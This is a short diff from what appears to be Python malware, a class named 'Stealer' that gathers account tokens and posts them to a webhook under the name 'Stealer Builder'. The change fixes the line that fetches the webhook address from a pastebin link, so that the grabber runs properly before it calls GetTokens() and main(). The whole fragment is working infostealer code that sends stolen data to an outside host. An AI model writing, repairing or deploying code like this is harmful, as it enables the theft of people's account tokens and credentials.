@@ -175,6 +175,6 @@ class Stealer():
             except:pass        
         requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "","embeds": embeds,"username": "Stealer Builder","avatar_url": "https://cdn.discordapp.com/avatars/922450497074495539/a_c1738e5280f6e70487ef02d307c62a07?size=1024"}).encode())
         
-Grabber = Stealer(requests.get("https://pastebin.com/raw/XXXXXXX"))
+Grabber = Stealer(requests.get("https://pastebin.com/raw/XXXXXXX").text)
 Grabber.GetTokens()
 Grabber.main()
